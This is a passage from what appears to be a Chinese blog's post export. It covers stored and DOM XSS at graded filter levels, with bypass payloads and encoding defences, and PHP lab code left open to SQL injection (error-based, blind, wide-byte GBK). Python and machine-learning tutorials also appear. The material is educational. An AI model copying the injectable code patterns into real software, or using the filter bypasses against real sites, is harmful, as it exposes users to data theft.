&quot;root&quot;; $dbname = &quot;security&quot;; // 创建连接 $conn = new mysqli($servername, $username, $password, $dbname); // 检测连接 if ($conn-&gt;connect_error) &#123; die(&quot;数据库连接失败: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;数据库连接成功&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = stripslashes( $message ); $message = mysqli_real_escape_string( $message ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQL插入语句：&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;新记录插入成功&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; 相关函数介绍： trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。 mysqli_real_escape_string(string,connection)函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。 stripslashes(string)函数删除字符串中的反斜杠。 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。 对Message字段注入XSS代码： 由于Name字段在前端有字数限制，可以直接使用Burp Suite抓包修改参数。 Medium Level 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = &quot;root&quot;; $dbname = &quot;security&quot;; // 创建连接 $conn = new mysqli($servername, $username, $password, $dbname); // 检测连接 if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;数据库连接成功&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = strip_tags( addslashes( $message ) ); $message = mysqli_real_escape_string( $message ); $message = htmlspecialchars( $message ); $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQL插入语句：&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; //$result = mysqli_query($query) or die(&#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;新记录插入成功&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; 相关函数介绍： htmlspecialchars：将特殊字符转换为 HTML 实体 字符 替换后 &amp; &amp;amp; &quot; &amp;quot;，除非设置了 ENT_NOQUOTES ’ 设置了 ENT_QUOTES 后， &amp;#039;(如果是 ENT_HTML401) ，或者 &amp;apos;(如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。 &lt; &amp;lt; &gt; &amp;gt; 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。跟反射型XSS一样，可以抓包修改参数使用双写绕过或大小写混淆绕过。 High Level 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = &quot;root&quot;; $dbname = &quot;security&quot;; // 创建连接 $conn = new mysqli($servername, $username, $password, $dbname); // 检测连接 if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;数据库连接成功&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = strip_tags( addslashes( $message ) ); $message = mysqli_real_escape_string( $message ); $message = htmlspecialchars( $message ); $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQL插入语句：&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;新记录插入成功&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; 可以看到，这里使用正则表达式过滤了&lt;script&gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。 同样抓包修改name参数为 &lt;img src=1 onerror=alert(\\xss\\)&gt; DOM型XSS 原理 用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要于服务器端交互，它只发生在客户端处理数据的阶段。 代码案例 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test DOM_XSS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function replace()&#123; document.getElementById(&quot;id1&quot;).innerHTML = document.getElementById(&quot;dom_input&quot;).value; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h6 id=&quot;id1&quot;&gt;这里会显示输入的内容&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;dom_input&quot; value=&quot;输入&quot;&gt;&lt;br&gt; &lt;input type=&quot;button&quot; value=&quot;替换&quot; onclick=&quot;replace()&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 0x03 XSS漏洞防御 因为XSS漏洞涉及输入和输出两个部分，所以其修复也分为两种。 过滤输入的数据，包括'’，&quot;，&lt;，&gt;，on*等非法字符。 对输入到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等。 HttpOnly HttpOnly主要防御的是XSS漏洞中的Cookie劫持，浏览器禁止页面的JavaScript访问带有HttpOnly属性的Cookie。例如： 1234567891011121314&lt;? phpsetcookie(&quot;cookie1&quot;, &quot;test1&quot;, NULL, NULL, NULL, NULL, FALSE);setcookie(&quot;cookie2&quot;, &quot;test2&quot;, NULL, NULL, NULL, NULL, TRUE);?&gt;&lt;html&gt;&lt;body&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(document.cookie); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 这段代码中，cookie1没有HttpOnly，cookie2被标记为HttpOnly。 输入检查（XSS Filter） 在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、&quot;等。如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查还会匹配XSS的特征，比如查找用户数据中是否包含了&lt;script&gt;、javascript等敏感字符。而且输入检查的逻辑必须放在服务器端代码实现。 但是XSS Filter有一个问题，就是对&quot;&lt;&quot;、&quot;&gt;&quot;等字符的处理，可能会改变用户输入数据的语义。并且，输入的数据会被展示在多个地方，每个地方的语境各不相同，例如： 用户输入的昵称如下： 12$nickname = &#x27;我是&quot;天才&quot;&#x27;; 如果被XSS Filter转义后： 12$nickname = &#x27;我是\\&quot;天才\\&quot;&#x27;; 如果在HTML代码中展示： 12&lt;div&gt;我是\\&quot;天才\\&quot;&lt;/div&gt; 如果在JavaScript代码展示： 123var nick = &#x27;我是\\&quot;天才\\&quot;&#x27;;document.write(nick); 输出检查 一般来说，除了富文本的输出，在变量输入到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。 HTMLEncode 针对HTML代码的编码方式是HtmlEncode，在HtmlEncode中要求至少转换：&amp;、&lt;、&gt;、&quot;、'、\\。 在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。 JavaScriptEncode JavaScriptEncode需要使用\\对特殊字符进行转义，而且在对抗XSS漏洞时，还要求输出的变量必须在引号内部，例如： 123var x = escapeJavaScript($evil);var y = &#x27;&quot;&#x27;+escapeJavaScript($evil)+&#x27;&quot;&#x27;; 如果输入的是1; alert(2)，则： 123var x = 1; alert(2);var y = &quot;1; alert(2)&quot;; 第一行执行了额外的代码，第二行则是安全的。 或者也可以使用更加严格的JavaScriptEncode函数来保证安全——除了数字和字母外的所有字符，都使用十六进制\\xHH的方式进行编码，例如： 12var x = 1\\x3balert\\x282\\x29; 具体实例 在HTML标签中输出 123&lt;div&gt;$var&lt;/div&gt;&lt;a href=#&gt;$var&lt;/a&gt; 这种情况一般是构造一个&lt;script&gt;标签，payload： 123&lt;div&gt;&lt;script&gt;alert(xss)&lt;/script&gt;&lt;/div&gt;&lt;a href=#&gt;&lt;img src=# onerror=alert(1)&gt;&lt;/a&gt; 防御方式是对变量使用HtmlEncode。 在HTML属性中输出 12&lt;div id=&quot;abc&quot; name=&quot;$var&quot;&gt;&lt;/div&gt; payload： 1234&lt;div id=&quot;abc&quot; name=&quot;&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;&quot;&gt;&lt;/div&gt;&gt; 防御方式也是采用HtmlEncode。 在&lt;script&gt;标签中输出 在&lt;script&gt;标签中输出，首先应该确保输出的变量在引号中： 1234&lt;script&gt;var x = &quot;$var&quot;;&lt;/script&gt; 攻击者首先要先闭合引号才能实施XSS攻击： 1234&lt;script&gt;var x = &quot;&quot;;alert(/xss/);//&quot;;&lt;/script&gt; 防御时使用JavaScriptEncode。 在事件中输出 12&lt;a href=# onclick=&quot;funcA(&#x27;$var&#x27;)&quot; &gt;test&lt;/a&gt; payload：var = '); alert(/xss/);// 即： 12&lt;a href=# onclick=&quot;funcA(&#x27;&#x27;); alert(/xss/);//&#x27;)&quot; &gt;test&lt;/a&gt; 防御时使用JavaScriptEncode编码。 在CSS中输出 一般来说，尽可能禁止用户可控制的变量在”&lt;style&gt;标签“、”HTML标签的style属性“以及”CSS文件“中输出。 在地址中输出 一个URL组成如下： 12[Protocal][Host][Path][Search][Hash] 例如： 1234567https:&#x2F;&#x2F;www.evil.com&#x2F;a&#x2F;b&#x2F;c&#x2F;?abc&#x3D;123#ssss[Protocal] &#x3D; &quot;https:&#x2F;&#x2F;&quot;[Host] &#x3D; &quot;www.evil.com&quot;[Path] &#x3D; &quot;&#x2F;a&#x2F;b&#x2F;c&#x2F;&quot;[Search] &#x3D; &quot;?abc&#x3D;123&quot;[Hash] &#x3D; &quot;#ssss&quot; 一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可。URLEncode会将字符转换为”%HH“形式。 但在Protocal和Host中不能使用严格的URLEncode编码，因为会把://、.等都编码掉。 12&lt;a href=&quot;$var&quot; &gt;Test&lt;/a&gt; 攻击者可以使用伪协议实施攻击： 12&lt;a href=&quot;javascript:alert(1);&quot;&gt;Test&lt;/a&gt; 对于Mozilla支持的dataURI伪协议，它能够将一段代码写在URI中，例如： 12&lt;a href=&quot;dataURI:test/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/a&gt; 这段代买的意思时，以test/html的格式加载编码为base64的数据。加载完成后实际上时： 12&lt;script&gt;alert(1)&lt;/script&gt; 对于这种手段的攻击，首先应该检查变量是否是以http开头，如果不是则自动加上，再对变量进行URLEncode，即可保证没有此类的XSS攻击。","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"XSS","slug":"XSS","permalink":"http://ca0y1h.top/tags/XSS/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Python面向对象高级编程之slots、@property和多重继承","date":"2019-11-01T06:33:37.000Z","path":"Python/code/5.Python面向对象高级编程之slots、@property和多重继承/","text":"Python面向对象高级编程之slots、@property和多重继承 Python对于类的属性的处理是非常灵活的，正常情况下，当我们定义了一个class，创建了一个class的实例后，我们可以给该实例绑定任何属性和方法 。今天这一篇文章就将两个关于对象的属性的用法：slots和@property。 __slots__变量 在类中定义__slots__变量可以限制实例的属性，比如， 只允许对Student实例添加name和age属性。 12class Student(): __slots__ = (&#x27;name&#x27;, &#x27;age&#x27;) 即用tuple定义允许绑定的属性名称，试图在实例中绑定其他属性会得到AttributeError的错误。 使用__slots__要注意，__slots__定义的属性仅对当前类实例起作用，对继承的子类是不起作用的。 除非在子类中也定义__slots__，这样，子类实例允许定义的属性就是自身的__slots__加上父类的__slots__。 @property 在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改，为了限制score的范围，通常的做法就是设置set和get方法。具体来说，可以通过一个set_score()方法来设置成绩，再通过一个get_score()来获取成绩，这样，在set_score()方法里，就可以检查参数。 但是通过Python内置的@property就可以把一个方法变成属性调用： 12345678910111213class Student(): @property def score(self): return self._score; @score.setter def score(self, value): if not isinstance(value, int): raise ValueError(&quot;score must be an integer&quot;) if value &lt; 0 and value &gt; 100: raise ValueError(&#x27;score must between 0 ~ 100!&#x27;) self._score = value 把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性： 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 多重继承 在谈到Python的多重继承的时候，绕不开的一个名词就是MixIn，如果之前写过Django Restful Framework框架，从很多函数名中就可以看出里面用到了很多MixIn。 在设计类的继承关系时，通常，主线都是单一继承下来的，例如，Ostrich继承自Bird。但是，如果需要“混入”额外的功能，通过多重继承就可以实现，比如，让Ostrich除了继承自Bird外，再同时继承Runnable。这种设计通常称之为MixIn。 比如： 12class Dog(Animal, RunnableMixIn, CarnivorousMixIn): pass MixIn的目的就是给一个类增加多个功能，这样，在设计类的时候，我们优先考虑通过多重继承来组合多个MixIn的功能，而不是设计多层次的复杂的继承关系。","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Web安全学习之各种注入类型的环境搭建和代码编写","date":"2019-10-30T05:24:03.000Z","path":"Web_security/basic_learning/7.各种注入类型的环境搭建和代码编写/","text":"Web安全学习之各种注入类型的环境搭建和代码编写 编写常规回显注入的代码，在之前搭建的环境中测试是否正常； 编写报错注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常； 编写盲注的代码，在之前的搭建环境中测试是否正常； 编写宽字节注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常。 0x01 回显注入 回显注入主要的是将查询的内容输出到页面上，这样报错才能回显信息。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;error_reporting(E_ALL ^ E_DEPRECATED);// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;?&gt; 0x02 报错注入 报错注入的原因是mysql_error这个函数导致的，作用是返回上一个mysql操作产生的文本错误信息。 报错注入的前提：页面上没有显示位，但是有sql语句执行错误信息输出。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;else&#123; print_r(mysqli_error($conn));&#125;?&gt; 0x03 盲注 盲注前提：没有显示位，也没有输出SQL语句执行错误，只显示页面正常和不正常。要有个empty函数来判断是否为空，否则and 1=2也会显示正常页面。 布尔盲注 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test Bool-Blind Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query: &#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;else&#123; echo &#x27;&#x27;;&#125;?&gt; 时间盲注 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test Bool-Blind Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query: &#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;else&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;?&gt; 和布尔盲注不同的是，不论怎么输入，回显的信息都是相同的。 0x04 宽字节注入 宽字节前提是数据库中采用gbk的编码方式。 如果存在宽字节注入，我们输入%df%27时，经过转译变成了%df%5c%27（%5c是反斜杠\\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（具体见GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;error_reporting(E_ALL ^ E_DEPRECATED);// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;*****&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names gbk&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id = addslashes($_GET[&#x27;id&#x27;]);&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;?&gt;","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Machine-Learning-Week2","date":"2019-10-29T08:07:41.000Z","path":"Machine_learning/basic_learning/2.Machine-Learning-Week2/","text":"Machine-Learning-Week2 多元线性回归 在上一周我们学了单变量线性回归方程及其梯度下降算法。但在实际运用的过程中，特征肯定是多样的，所以我们需要根据单变量线性回归方程推演出多元线性回归方程。比如说，一个二手房的价格可能会由房屋面积（Size）、房间数量（Number of bedrooms）、楼层数（Number of floor）、房屋年限（Age of home）这四个特征决定，如下图所示： x(i)表示第i条训练样本，x(i)j表示第i条训练样本的第j个特征。 所以我们得到的线性回归函数为： $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_2 + \\theta_3 x_3 + \\cdots + \\theta_n x_n $$ 如果把该函数的参数 θ 和变量 x 全部写成向量的形式，并且不妨假设x0=1就可以简化成下面这个函数： $$ \\begin{align*}h_\\theta(x) =\\begin{bmatrix}\\theta_0 \\hspace{2em} \\theta_1 \\hspace{2em} … \\hspace{2em} \\theta_n\\end{bmatrix}\\begin{bmatrix}x_0 \\newline x_1 \\newline \\vdots \\newline x_n\\end{bmatrix}= \\theta^T x\\end{align*} $$ 进一步来讲，如果我们把上图的训练样本逐行的写到矩阵当中，且记为X，即（假设只有三条数据）： $$ \\begin{align*}X = \\begin{bmatrix}x^{(1)}_0 &amp; x^{(1)}_1 &amp; x^{(1)}_2 &amp; x^{(1)}_3 &amp; x^{(1)}_4 \\newline x^{(2)}_0 &amp; x^{(2)}_1 &amp; x^{(2)}_2 &amp; x^{(2)}_3 &amp; x^{(2)}_4 \\newline x^{(3)}_0 &amp; x^{(3)}_1 &amp; x^{(3)}_2 &amp; x^{(3)}_3 &amp; x^{(3)}_4 \\end{bmatrix}&amp;,\\theta = \\begin{bmatrix}\\theta_0 \\newline \\theta_1 \\newline \\theta_2 \\newline \\theta_3 \\newline \\theta_4 \\newline\\end{bmatrix}\\end{align*} $$ 那么假设函数就可以写为： hθ(X)=Xθ 得到的结果就是一个m*1的向量。 多元梯度下降 上一篇学会了单变量的梯度下降算法，对于多元梯度下降算法，也就是一个照葫芦画瓢的过程了： $$ \\begin{align*} &amp; \\text{repeat until convergence:} ; \\lbrace \\newline ; &amp; \\theta_0 := \\theta_0 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_0^{(i)}\\newline ; &amp; \\theta_1 := \\theta_1 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_1^{(i)} \\newline ; &amp; \\theta_2 := \\theta_2 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_2^{(i)} \\newline &amp; \\cdots \\newline \\rbrace \\end{align*} $$ 即： $$ \\begin{align*}&amp; \\text{repeat until convergence:} ; \\lbrace \\newline ; &amp; \\theta_j := \\theta_j - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_j^{(i)} ; &amp; \\text{for j := 0…n}\\newline \\rbrace\\end{align*} $$ 特征放缩和归一化 如果你想预测房价，现在有两个变量 x1 和 x2 来作为特征，其中 x1 为房子的大小，范围在 0 到 2000，x2 为房子中卧室的数目，范围在 0 到 5，那么画出这个代价函数的轮廓图就是这个样子，一个扁扁的椭圆形： 对这个函数进行梯度下降，就是途中蓝线的过程，这个路程很长很曲折，这样我们进行梯度下降所花费的时间就会很长。 为了使特征值在一个相似的范围内变化（比如-1到+1之间），可以将变量进行特征放缩，如下图所示： 但是又出现一个问题，你会发现，现在经过处理之后的数据全是正值，不分散，那么我们就要用稍微复杂一点的方法进行特征缩放。用**均值归一化（Mean normalization）**的方法处理数据： $$ x_n = \\frac{x_n - μ_n}{s_n} $$ 其中 μn 为平均值，Sn 为标准差，也可以用这个变量最大值与最小值的差。现在你就会发现，数据既有正值也有负值，分散在-1 到 1 这个区间，进行梯度下降就会很快。 迭代的有效性 我们知道梯度下降算法是一个递归的过程，那么我们如何确定这个递归的方向是正确的呢？视频中给出了两种方法。 Debugging gradient descent 以X轴为迭代次数，Y轴为每次迭代的代价函数值来作图，如果图像是一个下降的过程，并在最后趋于平缓，那么这种迭代是有效的。如果图像是一个上升的过程，那么应该试着减小α的值。 Automatic convergence test 通过设定一个阈值ε（比如ε=10-3），如果每次迭代之后，代价函数的减少量小于阈值ε，那么就认定迭代是有效的。但是这种方法在实际应用中，并不太容易去确定阈值ε。 多项式回归方程 如果假设函数不能很好地拟合数据，则它不一定必须是一个线性的（直线）。我们可以通过将其设为二次，三次或平方根函数（或任何其他形式）来更改假设函数的行为。比如说根据面积的大小来预测房价，如果给定的数据集如下图所示： 那么我们可以把假设函数变为三次函数或平方根函数（因为二次函数在最大值之后会下降，这不符合实际情况）,即： $$ h_\\theta(x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_1^2 + \\theta_3 x_1^3 $$ 或者： $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 \\sqrt {x_1} $$ 这个时候特征放缩就显得尤为重要。 正规方程（Normal Equation） “正规方程”是一种无需迭代即可找到最佳θ的方法，公式如下： $$ \\theta = (X^T X)^{-1} X^T y $$ 无需对正规方程进行特征缩放。 举个例子，还是求房价，现在有 4 组训练集，如下表： 